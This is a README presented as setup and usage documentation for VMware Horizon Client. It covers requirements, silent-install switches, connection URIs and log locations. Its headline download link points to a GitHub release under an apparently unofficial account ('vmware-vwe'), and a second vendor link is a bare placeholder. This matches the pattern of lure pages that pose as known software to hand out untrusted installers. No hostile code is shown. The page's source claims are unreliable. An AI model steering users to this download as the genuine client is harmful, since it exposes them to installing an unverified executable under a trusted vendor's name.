# VMware Horizon Client

* [Installation](#installation)
* [System Requirements and Setup](#system-requirements-and-setup)
* [Installing and Updating Horizon Client](#installing-and-updating-horizon-client)
* [Configuring Horizon Client](#configuring-horizon-client)
* [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)

## Installation
To install VMware Horizon Client, begin by downloading the installer from the link provided below:      
**⬇️ [Download VMware Horizon Client](https://github.com/vmware-vwe/VMware-Horizon-Client/releases/tag/5.1)**

After the download completes, double-click the file to launch the installer. Proceed through the setup wizard to select your preferences—such as enabling smart card access, customizing display configurations, or optimizing for performance. Once installation is finished, open the client and log in with your credentials. If connection problems arise, verify your network configuration or reach out to your IT support team.

### System Requirements and Setup

#### Hardware and Software Requirements

Before starting the installation, confirm that your system satisfies the minimum specifications:

* **Processor**: x86-64 architecture with SSE2 capability (800 MHz or higher)
* **RAM**: Minimum of 1GB
* **Compatible Operating Systems**:

  * Windows 11 (64-bit: Versions 22H2, 21H2)
  * Windows 10 (64-bit: Versions 22H2, 21H2, 20H2, LTSC 2021/2019)
  * Windows Server 2012 R2, 2016, 2019

### Authentication and Security Features

Horizon Client accommodates a variety of login mechanisms, such as:

* **Smart Card Login**
* **Authentication via Client Certificates**
* **Two-Factor Authentication (RSA, RADIUS)**
* **Integration with Windows Hello for Business**

> \[!note]
> Some authentication types might necessitate additional setup on the Horizon Server.

---

### Supported Operating Systems

VMware Horizon Client for Windows is compatible with a wide range of both desktop and server editions of Windows. Refer to VMware's official documentation for detailed compatibility guidelines.

## Installing and Updating Horizon Client

### Installation Process

1. Get the installer from [VMware’s GitHub](*).
2. Launch the `.exe` file and follow the step-by-step instructions.
3. Select either a **Typical (Standard)** or **Custom (Advanced)** setup.
4. Agree to the terms and click **Agree & Install**. Restart your computer if prompted.

### Silent Installation Options

For automated or non-interactive installations, use this command:

```sh
VMware-Horizon-Client.exe /silent /install
```

To enable encryption that complies with FIPS standards:

```sh
VMware-Horizon-Client.exe VDM_FIPS_ENABLED=1
```

### Updating or Removing the Client

* To update, navigate to **Options > Software Updates** within the client.
* To uninstall the application, execute:

```sh
VMware-Horizon-Client.exe /uninstall
```

## Configuring Horizon Client

### Server Connection Configuration

Ensure these server-side settings are properly applied:

* **Correct IP address or DNS entry**
* **Enable Secure Tunnel**, when required
* **Activate Multi-Factor Authentication**, if applicable

### Common Configuration Methods

Adjust Horizon Client settings using one or more of the following:

* **Group Policy Objects (GPOs)**
* **Windows Registry Modifications**
* **Command-Line Parameters**

> \[!info]
> Advanced users can fine-tune settings via the registry path:
> `HKLM\Software\VMware, Inc.\Horizon Client`

## Connecting to Remote Desktops and Applications

### Login and Authentication Process

1. Start the Horizon Client.
2. Type in the **Connection Server** address.
3. Provide your **Login Credentials** (Username and Password).
4. Choose your **Desired Desktop or App** to initiate the session.

### Managing Sessions and Reconnect Options

* Enable **Auto-Reconnect** for seamless session restoration.
* Activate **Session Persistence** to retain unsaved progress.

---

### Shortcuts and Auto-Connect Tools

* Create a **Desktop Shortcut** for quick launching.
* Configure **Auto-Connect to Last Session** under preferences for efficiency.

## Using Remote Desktops and Applications

### Clipboard and File Sharing Capabilities

Enable **Clipboard Redirection** to move content between your local and virtual desktops. To share files, use drag-and-drop functionality across environments.
### Session Display and Input Customization

Modify the appearance and behavior of the remote session as needed:

```sh
vmware-view://desktopName?desktopLayout=fullscreen
```

### Tips for Better Performance

* Choose **VMware Blast** protocol for superior visual performance.
* Close background applications to free system resources.

---

## Using External Devices

### Configuring Multiple Displays

* **Extend Displays** to use more than one monitor.
* **Designate Monitors** specifically for remote output.

### USB and Peripheral Redirection

Enable USB device support by using this connection string:

```sh
vmware-view://server?connectUSBOnStartup=true
```

---

### Audio and Webcam Usage

* Improve conferencing quality with **Real-Time Audio-Video (RTAV)**.
* Select your **Preferred Microphone and Speakers** for best results.

## Security and Authentication Features

### Smart Card and Certificate Login

* Ensure **Smart Card Drivers** are properly installed and current.
* Use **Certificate-Based Authentication** for added security.

### Enabling Two-Factor Authentication

Set this up in the **Horizon Console > Security Settings** section to strengthen account protection.


## Troubleshooting and Logs

### Common Issues and Fixes

* **Seeing a black screen?** Try adjusting your display protocol.
* **Connection problems?** Check firewall rules or proxy server settings.


### Accessing Log Files

You can find log files at this directory:

```sh
C:\Users\<Username>\AppData\Local\VMware\VDM\Logs
```
